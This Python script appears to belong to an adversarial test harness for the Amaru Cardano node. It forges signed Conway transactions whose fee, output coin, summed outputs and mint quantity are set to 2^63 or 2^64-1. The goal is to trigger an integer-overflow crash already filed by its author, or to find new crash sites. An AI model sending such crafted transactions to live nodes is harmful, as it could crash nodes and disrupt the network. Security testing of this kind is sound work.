#!/usr/bin/env python3
"""R1b: value / int64 knife-edges beyond the 2^63 output-coin crash (already filed as coin-overflow).
Probe whether other value fields hit the same lovelace_to_i64 / value.rs:293 unreachable (same finding,
broader trigger) or a DIFFERENT crash site (new), vs a clean reject.

Cases (spend funded 9708b921, 4-element Conway tx):
  fee-overflow       : body fee (key2) = 2^63            -> sibling of the coin-overflow FEE trigger
  u64-max-output     : output coin = 2^64-1 (u64 max)    -> i64 overflow via max u64
  output-sum-overflow: two outputs ~2^62 each, sum>2^63  -> overflow via the output SUM
  mint-qty-overflow  : mint quantity = 2^63 (native-script 'all []' policy) -> DIFFERENT path (mint)
"""
import json, cbor2, hashlib, sys
from pathlib import Path
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives import serialization

ROOT = Path(__file__).resolve().parents[2]
FIX = ROOT / "antithesis/cardano_amaru_adversarial/fixture"
sys.path.insert(0, str(FIX / "collateral"))
from redeemers import split_tx  # noqa: E402
OUT = Path("/home/nigel/forge-work/pathb/outputs/forged-block/r1b")
I64_MAX = (1 << 63) - 1


def raw_vkey(k):
    return k.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)


def base_parts():
    seed = bytes.fromhex(json.loads((FIX / "funding" / "payment.skey").read_text())["cborHex"])[2:]
    pay = Ed25519PrivateKey.from_private_bytes(seed)
    raw = bytes.fromhex(json.loads((FIX / "mempool" / "mp-base.tx").read_text())["cborHex"])
    b, w, tail = split_tx(raw)
    base = cbor2.loads(b); tmpl = cbor2.loads(w)
    return pay, tmpl, base[0], bytes(base[1][0][0]), (base[1][0][1] if isinstance(base[1][0][1], int) else base[1][0][1][0]), base[2]


def rewrap(orig, lst):
    return cbor2.CBORTag(orig.tag, lst) if isinstance(orig, cbor2.CBORTag) else lst


def finalize(label, body, pay, tmpl, extra_wits=None):
    body_b = cbor2.dumps(body)
    h = hashlib.blake2b(body_b, digest_size=32).digest()
    wits = {0: rewrap(tmpl[0], [[raw_vkey(pay), pay.sign(h)]])}
    if extra_wits:
        wits.update(extra_wits)
    OUT.mkdir(parents=True, exist_ok=True)
    (OUT / f"{label}-preflight.cbor").write_bytes(cbor2.dumps([body, wits, True, None]))
    print(f"[{label}] txid {hashlib.blake2b(body_b, digest_size=32).hexdigest()[:16]} body_keys {sorted(body)}")


def main():
    pay, tmpl, inputs, addr, val, fee = base_parts()
    # 1. fee-overflow
    finalize("fee-overflow", {0: inputs, 1: [[addr, val]], 2: (1 << 63)}, pay, tmpl)
    # 2. u64-max-output
    finalize("u64-max-output", {0: inputs, 1: [[addr, (1 << 64) - 1]], 2: fee}, pay, tmpl)
    # 3. output-sum-overflow (two outputs each 2^62 -> sum 2^63)
    finalize("output-sum-overflow", {0: inputs, 1: [[addr, (1 << 62)], [addr, (1 << 62)]], 2: fee}, pay, tmpl)
    # 4. mint-qty-overflow: native script 'all []' policy, mint 2^63 of one asset
    script = [1, []]  # all of [] (vacuously true; no key needed)
    policy_id = hashlib.blake2b(b"\x00" + cbor2.dumps(script), digest_size=28).digest()
    body = {0: inputs, 1: [[addr, val]], 2: fee, 9: {policy_id: {b"TOK": (1 << 63)}}}
    finalize("mint-qty-overflow", body, pay, tmpl, extra_wits={1: [script]})


if __name__ == "__main__":
    main()
